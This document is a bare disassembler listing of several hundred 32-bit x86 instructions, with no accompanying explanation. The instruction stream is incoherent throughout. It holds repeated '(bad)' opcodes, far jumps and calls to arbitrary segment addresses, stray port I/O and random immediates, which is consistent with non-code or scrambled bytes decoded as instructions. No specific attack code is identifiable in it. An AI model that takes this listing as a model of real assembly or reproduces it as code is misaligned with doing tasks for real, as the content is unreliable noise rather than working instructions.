  41a726:	imul   ecx,DWORD PTR [ebp+0xcf9ebb2],0x5d64af29
  41a730:	or     al,0xad
  41a732:	fsub   QWORD PTR [esp+ebp*2]
  41a735:	mov    dl,0x8e
  41a737:	repz les edx,FWORD PTR [eax+ebx*4]
  41a73b:	int    0x89
  41a73d:	xchg   edx,eax
  41a73e:	shl    BYTE PTR [ecx-0x51924108],0x33
  41a745:	sbb    BYTE PTR [eax+0x2c],dl
  41a748:	cmp    ecx,eax
  41a74a:	or     al,0x4b
  41a74c:	les    ebp,FWORD PTR [ebx-0x1b5297d]
  41a752:	cs adc cl,BYTE PTR ss:0xd9b55953
  41a75a:	ret    0xc914
  41a75d:	pop    eax
  41a75e:	jb     0x41a6e7
  41a760:	mov    ah,0xe7
  41a762:	pop    ecx
  41a763:	or     al,0xae
  41a765:	push   ebp
  41a766:	push   ds
  41a767:	or     edi,DWORD PTR [edx]
  41a769:	push   ebx
  41a76a:	mov    eax,ds:0x19441577
  41a76f:	inc    ebx
  41a770:	or     ecx,edx
  41a772:	lahf   
  41a773:	sahf   
  41a774:	std    
  41a775:	xchg   ebp,eax
  41a776:	fdiv   st(5),st
  41a778:	or     eax,DWORD PTR [edi-0x55]
  41a77b:	push   esi
  41a77c:	in     eax,dx
  41a77d:	cdq    
  41a77e:	imul   DWORD PTR [esi-0x21c19408]
  41a784:	daa    
  41a785:	fcomp  QWORD PTR [edi+0x40e89460]
  41a78b:	lods   eax,DWORD PTR ds:[esi]
  41a78c:	test   BYTE PTR [edi-0x6b],dl
  41a78f:	(bad)  
  41a790:	xchg   ecx,eax
  41a791:	sub    eax,0x13b2ccbf
  41a796:	xchg   ecx,eax
  41a797:	jl     0x41a7e1
  41a799:	data16 fbstp TBYTE PTR ds:0xd43d69cb
  41a7a0:	loop   0x41a744
  41a7a2:	fisttp DWORD PTR [edx-0x49]
  41a7a5:	mov    ah,0x76
  41a7a7:	xchg   esp,eax
  41a7a8:	inc    eax
  41a7a9:	repnz xchg ebx,eax
  41a7ab:	fs inc esp
  41a7ad:	fcomp  QWORD PTR [ebx]
  41a7af:	sar    BYTE PTR [ecx+0x2fe4044b],0x75
  41a7b6:	(bad)  
  41a7b7:	mov    ebx,0xafb30f6
  41a7bc:	in     eax,dx
  41a7bd:	adc    al,0xf3
  41a7bf:	and    esi,0xf1e6b79
  41a7c5:	inc    esp
  41a7c6:	cmc    
  41a7c7:	jmp    0x41a78c
  41a7c9:	stc    
  41a7ca:	xor    DWORD PTR [eax],esp
  41a7cc:	stos   BYTE PTR es:[edi],al
  41a7cd:	(bad)  
  41a7ce:	lods   eax,DWORD PTR ds:[esi]
  41a7cf:	inc    ecx
  41a7d0:	or     al,0x60
  41a7d2:	aaa    
  41a7d3:	jecxz  0x41a7d6
  41a7d5:	push   0x1
  41a7d7:	or     ebp,DWORD PTR [ecx]
  41a7d9:	aaa    
  41a7da:	pop    ebp
  41a7db:	jmp    0x51edbbf1
  41a7e0:	xchg   ebx,eax
  41a7e1:	(bad)  
  41a7e2:	sbb    eax,DWORD PTR [ecx]
  41a7e4:	and    BYTE PTR [eax],0xbe
  41a7e7:	rcl    DWORD PTR [edi-0x77],0xf2
  41a7eb:	bound  edi,QWORD PTR [eax]
  41a7ed:	xchg   BYTE PTR [eax-0x45],bh
  41a7f0:	mov    dl,BYTE PTR [edx-0x587dbb2c]
  41a7f6:	(bad)  
  41a7f7:	fsub   st(6),st
  41a7f9:	xor    esp,0x23
  41a7fc:	scas   al,BYTE PTR es:[edi]
  41a7fd:	or     ebp,DWORD PTR [ebx+0x277d19ef]
  41a803:	add    al,0xbf
  41a805:	xor    DWORD PTR [ebx],0x4f
  41a808:	and    ecx,DWORD PTR [ecx-0x56ab3dde]
  41a80e:	or     DWORD PTR [esi-0x1c2e49a2],0x41
  41a815:	fst    QWORD PTR [edi-0x57f01629]
  41a81b:	or     DWORD PTR [ebx+0x27],0xfffffffa
  41a81f:	jo     0x41a7f5
  41a821:	inc    ebx
  41a822:	push   edx
  41a823:	add    BYTE PTR [ebx+0x556e7e86],0xff
  41a82a:	cmp    al,0x1e
  41a82c:	hlt    
  41a82d:	add    eax,0xf520b244
  41a832:	mov    bh,0x40
  41a834:	imul   edx,DWORD PTR [edx],0xa9052ad6
  41a83a:	jne    0x41a895
  41a83c:	out    dx,al
  41a83d:	pop    edx
  41a83e:	xor    eax,0x449f861d
  41a843:	rcr    DWORD PTR [ecx-0xddc008b],1
  41a849:	push   es
  41a84a:	test   al,0x1
  41a84c:	cli    
  41a84d:	into   
  41a84e:	loopne 0x41a866
  41a850:	dec    ebp
  41a851:	jne    0x41a882
  41a853:	ret    0x70e3
  41a856:	lds    eax,FWORD PTR [eax+0x40]
  41a859:	cmp    esi,DWORD PTR [edx+0x29]
  41a85c:	(bad)  
  41a85d:	(bad)  
  41a85e:	jo     0x41a8d6
  41a860:	clc    
  41a861:	into   
  41a862:	mov    dl,0x6e
  41a864:	loopne 0x41a829
  41a866:	mov    BYTE PTR [ecx+0x3122f5d7],cl
  41a86c:	and    esi,DWORD PTR [edx-0x3]
  41a86f:	test   al,0xa4
  41a871:	pop    ecx
  41a872:	mov    ebp,0x96ba2d6a
  41a877:	mov    esp,0x7618329a
  41a87c:	cs ins BYTE PTR es:[edi],dx
  41a87e:	sub    DWORD PTR [edx-0x1],0x2e
  41a882:	push   cs
  41a883:	enter  0xbc1,0xb3
  41a887:	or     ch,ah
  41a889:	sub    DWORD PTR [edx],ecx
  41a88b:	jl     0x41a8fb
  41a88d:	pop    edi
  41a88e:	movd   mm7,DWORD PTR ds:0x8842e02c
  41a895:	lods   eax,DWORD PTR ds:[esi]
  41a896:	jl     0x41a8cc
  41a898:	and    DWORD PTR [ebx*4-0x4639a512],0xffffffae
  41a8a0:	sub    ebp,DWORD PTR [eax+eax*2-0x4e]
  41a8a4:	repz call 0x29ce:0x99dbbe5d
  41a8ac:	push   esp
  41a8ad:	mov    WORD PTR [ebp-0x73],ss
  41a8b0:	xor    eax,0x60cf93ad
  41a8b5:	daa    
  41a8b6:	xchg   esi,eax
  41a8b7:	mov    bl,0xbc
  41a8b9:	push   esi
  41a8ba:	cmp    BYTE PTR [edi+eax*1+0x503a452e],dl
  41a8c1:	in     eax,0x32
  41a8c3:	div    DWORD PTR [esi]
  41a8c5:	rcr    BYTE PTR [ebx-0x79],cl
  41a8c8:	fisttp QWORD PTR [edi+esi*2]
  41a8cb:	pushf  
  41a8cc:	iret   
  41a8cd:	popa   
  41a8ce:	mov    ecx,DWORD PTR [ecx-0x39]
  41a8d1:	jecxz  0x41a8b2
  41a8d3:	stos   BYTE PTR es:[edi],al
  41a8d4:	addr16 inc esi
  41a8d6:	test   eax,0x7164a3d4
  41a8db:	shl    BYTE PTR [edi-0x36],1
  41a8de:	xchg   ebx,eax
  41a8df:	dec    esi
  41a8e0:	test   DWORD PTR ds:0xab0f1cb5,esp
  41a8e6:	sahf   
  41a8e7:	sbb    al,0xd0
  41a8e9:	ja     0x41a86f
  41a8eb:	(bad)  
  41a8ed:	mov    ds:0x19ab80d3,al
  41a8f2:	sbb    al,0xd4
  41a8f4:	mov    al,BYTE PTR [edx+0x60]
  41a8f7:	mov    al,ds:0x8b085dbe
  41a8fc:	xor    esi,esp
  41a8fe:	adc    esp,DWORD PTR [ebp+0x1b]
  41a901:	xchg   DWORD PTR [esi-0x13],edx
  41a904:	out    0x3c,al
  41a906:	dec    esp
  41a907:	sub    ecx,edx
  41a909:	sahf   
  41a90a:	jae    0x41a910
  41a90c:	jae    0x41a90e
  41a90e:	inc    ebp
  41a90f:	add    ebp,DWORD PTR [ecx+eax*2+0x4e3e6ad4]
  41a916:	leave  
  41a917:	xor    eax,0xef65391
  41a91c:	add    edx,DWORD PTR [edi]
  41a91e:	js     0x41a8ad
  41a920:	push   0xffffffe1
  41a922:	adc    bh,ah
  41a924:	ins    BYTE PTR es:[edi],dx
  41a925:	mov    eax,ds:0xd392d8b5
  41a92a:	mov    al,ds:0x926c639b
  41a92f:	add    eax,0x640e7884
  41a934:	xor    esi,DWORD PTR [ebx+0x148407dd]
  41a93a:	test   al,0x3e
  41a93c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a93d:	cmp    eax,0x6fd10e7c
  41a942:	ret    
  41a943:	lods   eax,DWORD PTR ss:[esi]
  41a945:	lods   eax,DWORD PTR ds:[esi]
  41a946:	xor    esi,DWORD PTR [edi]
  41a948:	out    dx,eax
  41a949:	cwde   
  41a94a:	jge    0x41a8f5
  41a94c:	sbb    al,BYTE PTR [edi+0x6e4ad588]
  41a952:	mov    esi,0xdf44ab3e
  41a957:	mov    edi,0x600a7af1
  41a95c:	ror    DWORD PTR [esi-0x67b96320],0x27
  41a963:	fs add eax,0xd4bb45ad
  41a969:	jns    0x41a99d
  41a96b:	and    al,0xd8
  41a96d:	jecxz  0x41a986
  41a96f:	dec    eax
  41a970:	jg     0x41a91c
  41a972:	dec    edx
  41a973:	outs   dx,BYTE PTR ds:[esi]
  41a974:	pop    es
  41a975:	adc    BYTE PTR [edi+0x332a1fe0],0x3c
  41a97c:	adc    BYTE PTR [ecx],ah
  41a97e:	idiv   DWORD PTR [edx+eiz*1+0x36]
  41a982:	js     0x41a978
  41a984:	cmc    
  41a985:	inc    ebp
  41a986:	sub    BYTE PTR [edi+0x1b6c3844],ah
  41a98c:	gs mov bh,0xc6
  41a98f:	enter  0x887,0x7c
  41a993:	mov    ?,WORD PTR [esi-0x51]
  41a996:	mov    edi,0x1afce22b
  41a99b:	cld    
  41a99c:	xor    bl,BYTE PTR [ecx-0x7b]
  41a99f:	bound  ebp,QWORD PTR [eax]
  41a9a1:	or     edi,DWORD PTR [ebx+edx*2+0x32]
  41a9a5:	shl    BYTE PTR [ecx+ebx*8-0x18d864db],0x8c
  41a9ad:	adc    al,BYTE PTR [eax-0x76e24a3d]
  41a9b3:	loop   0x41aa23
  41a9b5:	and    DWORD PTR [ebp+0x4e],0xffffffaa
  41a9b9:	xchg   ebx,eax
  41a9ba:	imul   ecx,DWORD PTR [edx],0x7d9fdab5
  41a9c0:	and    ch,bl
  41a9c2:	cmp    ah,BYTE PTR [edi-0x379c3ee9]
  41a9c8:	push   cs
  41a9c9:	and    bl,BYTE PTR [edx+0x5e]
  41a9cc:	inc    edx
  41a9cd:	jno    0x41a9d5
  41a9cf:	inc    eax
  41a9d0:	pop    ecx
  41a9d1:	call   0xcaa72bb0
  41a9d6:	mov    eax,ds:0xdf
  41a9db:	add    BYTE PTR [eax],al
  41a9dd:	add    BYTE PTR [eax],al
  41a9df:	add    BYTE PTR [eax],al
  41a9e1:	inc    ebx
  41a9e2:	clc    
  41a9e3:	gs sbb edi,edi
  41a9e6:	popf   
  41a9e7:	jg     0x41a9e3
  41a9e9:	mov    al,0x88
  41a9eb:	dec    ebp
  41a9ec:	sahf   
  41a9ed:	inc    ebx
  41a9ee:	popa   
  41a9ef:	clc    
  41a9f0:	addr16 jb 0x41aa1a
  41a9f3:	add    DWORD PTR [eax],eax
  41a9f5:	scas   eax,DWORD PTR es:[edi]
  41a9f6:	add    eax,DWORD PTR [eax]
  41a9f8:	add    BYTE PTR [ecx-0x53],al
  41a9fb:	addr16 shl eax,0x24
  41a9ff:	dec    eax
  41aa00:	sub    esp,esp
  41aa02:	dec    esi
  41aa03:	jo     0x41aa47
  41aa05:	adc    BYTE PTR [esi+0x3d],dh
  41aa08:	fidiv  DWORD PTR [edx-0x213f5e5e]
  41aa0e:	scas   eax,DWORD PTR es:[edi]
  41aa0f:	mov    ebx,edx
  41aa11:	imul   edi,DWORD PTR [esi+0x4],0xac00a19b
  41aa18:	fdiv   QWORD PTR [ecx]
  41aa1a:	push   ds
  41aa1b:	imul   esp,DWORD PTR [ebp+0x40],0x63
  41aa1f:	cmp    eax,0xfb64f0f4
  41aa24:	leave  
  41aa25:	xchg   esi,eax
  41aa26:	mov    eax,DWORD PTR [ebx+eax*4]
  41aa29:	fisttp QWORD PTR [edi+eiz*4+0x14]
  41aa2d:	mov    dh,0x6d
  41aa2f:	push   eax
  41aa30:	mov    dh,0x70
  41aa32:	mov    ch,0x2d
  41aa34:	out    dx,eax
  41aa35:	xlat   BYTE PTR ds:[ebx]
  41aa36:	iret   
  41aa37:	das    
  41aa38:	adc    eax,0x9e5aea30
  41aa3d:	js     0x41aa9a
  41aa3f:	jo     0x41aa82
  41aa41:	add    eax,0xc57c8408
  41aa46:	mov    dh,0xbc
  41aa48:	aas    
  41aa49:	push   ds
  41aa4a:	push   esi
  41aa4b:	jl     0x41a9f5
  41aa4d:	and    ah,bl
  41aa4f:	add    bh,0x7c
  41aa52:	adc    al,0xa3
  41aa54:	sub    eax,0x4e53ef6a
  41aa59:	gs int 0xf5
  41aa5c:	mov    esp,0x36a3fe12
  41aa61:	leave  
  41aa62:	xchg   ecx,eax
  41aa63:	loopne 0x41aad9
  41aa65:	(bad)  
  41aa66:	jne    0x41aa6b
  41aa68:	out    dx,eax
  41aa69:	mov    ebp,0xf1d18154
  41aa6e:	repnz mov BYTE PTR [ecx],cl
  41aa71:	mov    DWORD PTR ds:0x7fd2952,ebp
  41aa77:	push   ss
  41aa78:	cwde   
  41aa79:	push   cx
  41aa7b:	rcr    BYTE PTR [esi-0x53],0x64
  41aa7f:	push   edx
  41aa80:	mov    edx,0xa7ed2d59
  41aa85:	ret    
  41aa86:	jle    0x41aa6b
  41aa88:	inc    ecx
  41aa89:	addr16 in eax,0x1d
  41aa8c:	xchg   DWORD PTR [edx+edx*2-0x12],edi
  41aa90:	das    
  41aa91:	cmp    al,0xfc
  41aa93:	into   
  41aa94:	mov    BYTE PTR [ebp+0xd49fb9b],0x5b
  41aa9b:	cwde   
  41aa9c:	cs push ebp
  41aa9e:	imul   eax,DWORD PTR [edx-0x4aa53692],0x5f
  41aaa5:	mov    eax,ds:0xb019e86f
  41aaaa:	jb     0x41aada
  41aaac:	popa   
  41aaad:	loopne 0x41aae5
  41aaaf:	mov    ebp,0xbf8da2cf
  41aab4:	push   0x79a26747
  41aab9:	test   eax,0xdcb19dbb
  41aabe:	push   edi
  41aabf:	adc    BYTE PTR [edx+0x3c],cl
  41aac2:	push   edi
  41aac3:	xor    ebp,esi
  41aac5:	push   es
  41aac6:	mov    es,WORD PTR [edx-0x76]
  41aac9:	push   esp
  41aaca:	int3   
  41aacb:	out    0x14,eax
  41aacd:	(bad)
  41aad1:	loope  0x41ab03
  41aad3:	xchg   ebp,eax
  41aad4:	lods   al,BYTE PTR ds:[esi]
  41aad5:	and    DWORD PTR [eax-0x5d742a83],0x6be165a1
  41aadf:	shr    BYTE PTR [esi],cl
  41aae1:	cdq    
  41aae2:	stos   BYTE PTR es:[edi],al
  41aae3:	ins    DWORD PTR es:[edi],dx
  41aae4:	hlt    
  41aae5:	xor    al,bh
  41aae7:	mov    cl,0x0
  41aae9:	rol    BYTE PTR [ebx+0x78a967c],cl
  41aaef:	dec    edi
  41aaf0:	or     DWORD PTR [esi-0x36f334c7],ebp
  41aaf6:	std    
  41aaf7:	xchg   ebp,eax
  41aaf8:	cmp    eax,0xa37088ed
  41aafd:	(bad)  
  41aafe:	jmp    0x41ab19
  41ab00:	popa   
  41ab01:	and    BYTE PTR [ebp+ebp*8-0x67],bh
  41ab05:	lods   eax,DWORD PTR ds:[esi]
  41ab06:	fwait
  41ab07:	adc    BYTE PTR [esi],0x6b
  41ab0a:	add    bl,bh
  41ab0c:	jo     0x41ab51
  41ab0e:	loopne 0x41aabd
  41ab10:	sub    al,0x36
  41ab12:	sti    
  41ab13:	leave  
  41ab14:	ret    0xb5b3
  41ab17:	jmp    0x8bf312da
  41ab1c:	popa   
  41ab1d:	add    ebp,DWORD PTR [esi+0x4b8f9dfa]
  41ab23:	mov    eax,0xd0d6bb1b
  41ab28:	retf   
  41ab29:	jo     0x41ab60
  41ab2b:	cmp    eax,0xfcea318d
  41ab30:	push   ss
  41ab31:	dec    edx
  41ab32:	xlat   BYTE PTR ds:[ebx]
  41ab33:	pop    ds
  41ab34:	xor    al,0x8f
  41ab36:	mov    ds:0x4a127ee6,al
  41ab3b:	mov    dh,0x6c
  41ab3d:	inc    ebx
  41ab3e:	mov    al,0x0
  41ab40:	xchg   ebp,eax
  41ab41:	retf   0xc284
  41ab44:	and    eax,0x76036d8e
  41ab49:	stos   DWORD PTR es:[edi],eax
  41ab4a:	or     DWORD PTR [esi],0xbe91a147
  41ab50:	clc    
  41ab51:	(bad)  
  41ab52:	lock sub eax,0x9feff5ff
  41ab58:	jno    0x41aae9
  41ab5a:	xchg   edi,eax
  41ab5b:	sbb    BYTE PTR [edx],dh
  41ab5d:	ror    bh,cl
  41ab5f:	cmp    al,0x3c
  41ab61:	mov    DWORD PTR [edi-0x5b5f92a4],esp
  41ab67:	pop    edi
  41ab68:	and    bh,ch
  41ab6a:	ret    0xb032
  41ab6d:	popa   
  41ab6e:	ja     0x41abc7
  41ab70:	imul   ebx,DWORD PTR [eax+0x71],0x20
  41ab74:	ret    0x98f5
  41ab77:	mov    ecx,0xf9d64b60
  41ab7c:	repnz out dx,al
  41ab7e:	xchg   ebx,eax
  41ab7f:	mov    ebx,0xefadc0f4
  41ab84:	or     al,0xd2
  41ab86:	push   ebx
  41ab87:	add    al,0xd2
  41ab89:	aad    0x79
  41ab8b:	sbb    BYTE PTR [esi+esi*1+0x12f29c3c],al
  41ab92:	dec    esi
  41ab93:	xchg   esp,eax
  41ab94:	and    dl,BYTE PTR [edi+0x2d]
  41ab97:	fbld   TBYTE PTR [ecx+0xc]
  41ab9a:	add    edx,DWORD PTR [eax-0xc9c05b4]
  41aba0:	mov    gs,WORD PTR [esi]
  41aba2:	cmp    BYTE PTR [ebx],bl
  41aba4:	rcl    BYTE PTR [ebp+0x1acdf7b0],0xbd
  41abab:	cmp    eax,0xa5e39d82
  41abb0:	mov    dh,0x75
  41abb2:	xor    eax,0xc3057086
  41abb7:	and    DWORD PTR [ebx+0x5b],0x7ef82ba7
  41abbe:	push   eax
  41abbf:	adc    ah,bl
  41abc1:	lods   al,BYTE PTR ds:[esi]
  41abc2:	jmp    0x903b:0x2da6fb78
  41abc9:	scas   eax,DWORD PTR es:[edi]
  41abca:	xchg   ebx,eax
  41abcb:	mov    cs,WORD PTR [esi+0x5d6accb9]
  41abd1:	mov    eax,ds:0x9e62ba45
  41abd6:	add    ecx,DWORD PTR [ecx-0x245ab4e3]
  41abdc:	and    DWORD PTR [eax+0x38b187fb],0x708ddaa2
  41abe6:	mov    ds:0xf50e00ec,eax
  41abeb:	lods   eax,DWORD PTR ds:[esi]
  41abec:	push   0x14
  41abee:	and    edx,0x817804ee
  41abf4:	cmp    DWORD PTR [ebx+0x7e],0x40
  41abf8:	sbb    BYTE PTR [edi+0x7f],0x5a
  41abfc:	dec    edi
  41abfd:	adc    eax,0x359228fa
  41ac02:	ret    
  41ac03:	xchg   BYTE PTR [ebx],dh
  41ac05:	sub    DWORD PTR [ecx-0x11],ecx
  41ac08:	stc    
  41ac09:	cmp    DWORD PTR [ebp+0x40ecf61e],esi
  41ac0f:	xor    eax,0xc1ba6177
  41ac14:	ins    BYTE PTR es:[edi],dx
  41ac15:	sti    
  41ac16:	jg     0x41ac03
  41ac18:	cmp    al,0x20
  41ac1a:	(bad)  
  41ac1b:	pop    ss
  41ac1c:	sbb    DWORD PTR [ebx],edx
  41ac1e:	das    
  41ac1f:	sbb    BYTE PTR [esi+0x3],bl
  41ac22:	aaa    
  41ac23:	rcr    DWORD PTR [esi],cl
  41ac25:	or     edi,eax
  41ac27:	mov    bh,0x2a
  41ac29:	scas   al,BYTE PTR es:[edi]
  41ac2a:	inc    esi
  41ac2b:	aam    0x97
  41ac2d:	test   BYTE PTR [edi-0x3c89c6f4],dh
  41ac33:	sbb    al,0xf1
  41ac35:	addr16 dec ebp
  41ac37:	pushf  
  41ac38:	ret    
  41ac39:	jge    0x41ac5b
  41ac3b:	inc    edx
  41ac3c:	int3   
  41ac3d:	addr16 daa 
  41ac3f:	dec    esi
  41ac40:	fadd   DWORD PTR [esi]
  41ac42:	test   DWORD PTR [ebx],0xeb79b237
  41ac48:	cld    
  41ac49:	in     eax,0x79
  41ac4b:	cmp    dh,BYTE PTR [edx-0x3eb55d80]
  41ac51:	dec    esi
  41ac52:	gs out 0x8f,eax
  41ac55:	sbb    DWORD PTR [ebx-0x25],ebp
  41ac58:	jge    0x41acd1
  41ac5a:	sub    eax,0xa6550c1f
  41ac5f:	pop    ds
  41ac60:	jbe    0x41abf0
  41ac62:	and    eax,DWORD PTR [ebp+0x4a7b333c]
  41ac68:	or     BYTE PTR [edi+0x1f],dh
  41ac6b:	mov    al,0x3
  41ac6d:	add    eax,esi
  41ac6f:	xchg   al,bl
  41ac71:	icebp  
  41ac72:	or     DWORD PTR [edx+0x2114a827],0x5
  41ac79:	jl     0x41aca6
  41ac7b:	jecxz  0x41ac12
  41ac7d:	and    BYTE PTR [esi-0x393a0210],dh
  41ac83:	dec    edx
  41ac84:	data16 icebp 
  41ac86:	sahf   
  41ac87:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ac88:	retf   0xd933
  41ac8b:	pop    esp
  41ac8c:	dec    edi
  41ac8d:	cmp    BYTE PTR [eax],0x55
  41ac90:	out    dx,eax
  41ac91:	cmp    al,0x57
  41ac93:	mov    dh,BYTE PTR [ebx+0xa]
  41ac96:	jno    0x41acf9
  41ac98:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ac99:	inc    ebp
  41ac9a:	data16 cld 
  41ac9c:	jmp    0xbe90:0x9f14910c
  41aca3:	inc    ecx
  41aca4:	fs inc ebx
  41aca6:	push   edx
  41aca7:	aad    0x7d
  41aca9:	push   esi
  41acaa:	cli    
  41acab:	test   BYTE PTR [esi+0x1c],dh
  41acae:	iret   
  41acaf:	xchg   ebp,eax
  41acb0:	push   ebp
  41acb1:	or     edx,esp
  41acb3:	dec    esp
  41acb4:	xor    DWORD PTR ds:0x7f0053de,ecx
  41acba:	iret   
  41acbb:	jg     0x41ac6e
  41acbd:	arpl   WORD PTR ds:[edx+0x164e810c],si
  41acc4:	adc    bh,BYTE PTR [edx]
  41acc6:	xchg   ebp,ebx
  41acc8:	xchg   ebx,eax
  41acc9:	cmc    
  41acca:	ror    DWORD PTR [edx],0xc8
  41accd:	push   ss
  41acce:	in     eax,dx
  41accf:	jne    0x41ac83
  41acd1:	shr    DWORD PTR [ebx+0x40],cl
  41acd4:	cdq    
  41acd5:	sbb    dl,BYTE PTR [eax-0x7a5d12ff]
  41acdb:	pop    edx
  41acdc:	dec    eax
  41acdd:	(bad)  
  41acde:	fst    QWORD PTR [edx]
  41ace0:	cwde   
  41ace1:	out    dx,eax
  41ace2:	fimul  DWORD PTR [edx-0x5c3cb0db]
  41ace8:	xor    eax,0x8d29c437
  41aced:	cdq    
  41acee:	sub    eax,0x214bef3c
  41acf3:	fwait
  41acf4:	sub    BYTE PTR [esi+0x50],cl
  41acf7:	iret   
  41acf8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41acf9:	push   esi
  41acfa:	shl    BYTE PTR [ebx],0x70
  41acfd:	xor    DWORD PTR [edx+0x51],edx
  41ad00:	push   ecx
  41ad01:	mov    bh,0xcd
  41ad03:	push   cs
  41ad04:	jp     0x41ac8a
  41ad06:	adc    bl,BYTE PTR [ebx-0x73]
  41ad09:	loopne 0x41ad4b
  41ad0b:	in     eax,dx
  41ad0c:	add    edx,DWORD PTR [esi+0x15cbe3a2]
  41ad12:	pop    esp
  41ad13:	add    BYTE PTR [ecx+0x75fe32a0],ch
  41ad19:	jns    0x41ad76
  41ad1b:	daa    
  41ad1c:	loope  0x41ad6d
  41ad1e:	mov    dh,0xb3
  41ad20:	rol    DWORD PTR [edi],cl
  41ad22:	mov    esi,0x777a4cd6
  41ad27:	dec    esp
  41ad28:	mov    BYTE PTR [ebp-0x28],cl
  41ad2b:	popf   
  41ad2c:	or     edi,edi
  41ad2e:	add    al,0x36
  41ad30:	pop    edx
  41ad31:	outs   dx,DWORD PTR ds:[esi]
  41ad32:	xor    ah,BYTE PTR [eax-0x1c8eed8]
  41ad38:	out    0x37,eax
  41ad3a:	fwait
  41ad3b:	push   esp
  41ad3c:	inc    ebp
  41ad3d:	push   edx
  41ad3e:	shr    BYTE PTR [edi+edi*4],1
  41ad41:	repz mov ebp,0xe1bd539
  41ad47:	jae    0x41ad48
  41ad49:	jge    0x41ad54
  41ad4b:	and    BYTE PTR [esi+ecx*8-0x749fac0d],0x11
  41ad53:	mov    BYTE PTR [ecx+eax*4],ch
  41ad56:	sbb    eax,0xe74d865b
  41ad5b:	sar    DWORD PTR [ebx],cl
  41ad5d:	ret    
  41ad5e:	jg     0x41ad92
  41ad60:	xor    ch,cl
  41ad62:	test   al,0x19
  41ad64:	mov    WORD PTR [esi-0x6d],?
  41ad67:	(bad)  
  41ad68:	pop    eax
  41ad69:	psubsw mm2,QWORD PTR [edx]
  41ad6c:	xor    ah,BYTE PTR [ecx-0x618dcd66]
  41ad72:	out    0xfe,eax
  41ad74:	xor    edi,DWORD PTR ds:0x7c588669
  41ad7a:	lds    esp,FWORD PTR [ecx]
  41ad7c:	repnz xchg ecx,eax
  41ad7e:	inc    esi
  41ad7f:	not    DWORD PTR [ebx-0x25]
  41ad82:	call   0x4f87:0xc256907a
  41ad89:	cmc    
  41ad8a:	add    eax,0xbf9d8dab
  41ad8f:	pop    ecx
  41ad90:	cmp    DWORD PTR [edi+0x3],esi
  41ad93:	sub    DWORD PTR [ecx-0x61],edi
  41ad96:	jg     0x41ad72
  41ad98:	(bad)  
  41ad99:	retf   0xd974
  41ad9c:	pop    esi
  41ad9d:	loop   0x41ad68
  41ad9f:	popa   
  41ada0:	ja     0x41adc0
  41ada2:	shl    BYTE PTR [esi-0x6cea23ac],1
	...
  41adb0:	add    BYTE PTR [edi],al
  41adb2:	sbb    BYTE PTR [esi+0x3fbf9fa7],0xa2
  41adb9:	dec    eax
  41adba:	imul   ebx,DWORD PTR [eax+edx*4+0x6ae1676e],0x21
  41adc2:	sub    eax,DWORD PTR [ecx]
  41adc4:	add    BYTE PTR [edi+0x48000003],ch
  41adca:	pop    ds
  41adcb:	sbb    al,0x80
  41adcd:	jne    0x41adc4
  41adcf:	xor    DWORD PTR [edx+edx*4+0x1a058b04],esi
  41add6:	ficom  DWORD PTR [edx+esi*1-0x3266a686]
  41addd:	push   edi
  41adde:	imul   esi,DWORD PTR [edi-0x1d],0x4f65fd73
  41ade5:	imul   edi,DWORD PTR [edx],0x61348409
  41adeb:	into   
  41adec:	push   edi
  41aded:	or     eax,0x92294044
  41adf2:	retf   
  41adf3:	xor    al,dl
  41adf5:	aad    0xd3
  41adf7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41adf8:	push   ecx
  41adf9:	push   edx
  41adfa:	shl    ecx,cl
  41adfc:	cmp    BYTE PTR ds:0x621f4c97,ch
  41ae02:	pop    DWORD PTR [ebx+ebp*1]
  41ae05:	mov    esp,0xfa03d45c
  41ae0a:	xor    DWORD PTR [ecx+0x12],edi
  41ae0d:	xchg   esp,eax
  41ae0e:	test   DWORD PTR [edx+0x60],esp
  41ae11:	pop    esi
  41ae12:	ror    DWORD PTR [edx+0xc],cl
  41ae15:	scas   eax,DWORD PTR es:[edi]
  41ae16:	and    BYTE PTR ds:0xb70e1091,cl
  41ae1c:	xchg   esp,eax
  41ae1d:	call   0x87f3:0xf6984f87
  41ae24:	xchg   ebx,eax
  41ae25:	div    DWORD PTR [esi+0x1b1ed94f]
  41ae2b:	mov    al,ds:0x4f28d54d
  41ae30:	jb     0x41adcb
  41ae32:	xchg   ebx,eax
  41ae33:	jmp    0x41adda
  41ae35:	dec    ebp
  41ae36:	and    BYTE PTR [esi],al
  41ae38:	push   es
  41ae39:	test   eax,0x23646d36
  41ae3e:	dec    esp
  41ae3f:	jmp    0xd26f1f2f
  41ae44:	adc    edi,eax
  41ae46:	jmp    0xe146c81a
  41ae4b:	je     0x41ae99
  41ae4d:	mov    bh,BYTE PTR [esi]
  41ae4f:	and    eax,0xbe35e495
  41ae54:	mov    esp,0x6fdf1adb
  41ae59:	add    DWORD PTR [ebp+0x483583a2],esi
  41ae5f:	mov    ebx,DWORD PTR [ebp+0x252393d3]
  41ae65:	xchg   DWORD PTR [esi-0x6bb188fe],esi
  41ae6b:	fst    QWORD PTR [ecx-0x7f5ff9e7]
  41ae71:	cmp    BYTE PTR [ebx],0x54
  41ae74:	xor    dl,BYTE PTR [ebx+0x5b]
  41ae77:	ja     0x41ae7d
  41ae79:	repz sub BYTE PTR [ebx+0x7b],ah
  41ae7d:	call   0x4463:0x3aed0540
  41ae84:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ae85:	bound  esi,QWORD PTR [ecx+0x3c]
  41ae88:	call   0x680c3847
  41ae8d:	mov    ebp,DWORD PTR [ecx+0x38]
  41ae90:	fwait
  41ae91:	mov    ds:0xcd4d6199,al
  41ae96:	sar    DWORD PTR [esi+0x1f],1
  41ae99:	mov    DWORD PTR [ecx],ebp
  41ae9b:	or     al,0xa0
  41ae9d:	xchg   edi,eax
  41ae9e:	jecxz  0x41aeb6
  41aea0:	stc    
  41aea1:	cs mov al,0x4a
  41aea4:	mov    edx,0xadc7a504
  41aea9:	sub    BYTE PTR [edi+0x344efc7e],0x33
  41aeb0:	pop    ebp
  41aeb1:	loop   0x41ae40
  41aeb3:	jmp    0x41ae84
  41aeb5:	and    ebx,0x37494d1d
  41aebb:	jmp    0xd5591501
  41aec0:	xor    DWORD PTR ds:0x97f3d7a,edx
  41aec7:	push   ss
  41aec8:	sahf   
  41aec9:	sub    BYTE PTR ds:0x10f032cb,bh
